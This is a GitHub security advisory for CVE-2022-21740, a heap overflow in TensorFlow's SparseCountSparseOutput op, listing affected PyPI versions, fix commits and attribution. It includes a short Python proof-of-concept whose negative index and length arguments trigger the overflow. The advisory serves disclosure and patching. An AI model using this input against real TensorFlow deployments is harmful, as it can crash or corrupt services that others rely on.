# [H] Heap overflow in Tensorflow

## Summary
Severity: High
Advisory: GHSA-44qp-9wwf-734r
CVE: CVE-2022-21740
CWE: CWE-120, CWE-787
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2022-02-09
Source: https://github.com/advisories/GHSA-44qp-9wwf-734r
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.5.3
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.1

## Details
### Impact 
The [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) is vulnerable to a heap overflow:

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseCountSparseOutput(
  indices=[[-1,-1]],
  values=[2],
  dense_shape=[1, 1],
  weights=[1],
  binary_output=True,
  minlength=-1,
  maxlength=-1,
  name=None)
```

### Patches
We have patched the issue in GitHub commits [2b7100d6cdff36aa21010a82269bc05a6d1cc74a](https://github.com/tensorflow/tensorflow/commit/2b7100d6cdff36aa21010a82269bc05a6d1cc74a) and [adbbabdb0d3abb3cdeac69e38a96de1d678b24b3](https://github.com/tensorflow/tensorflow/commit/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-44qp-9wwf-734r
- https://nvd.nist.gov/vuln/detail/CVE-2022-21740
- https://github.com/tensorflow/tensorflow/commit/2b7100d6cdff36aa21010a82269bc05a6d1cc74a
- https://github.com/tensorflow/tensorflow/commit/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2022-64.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2022-119.yaml
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273
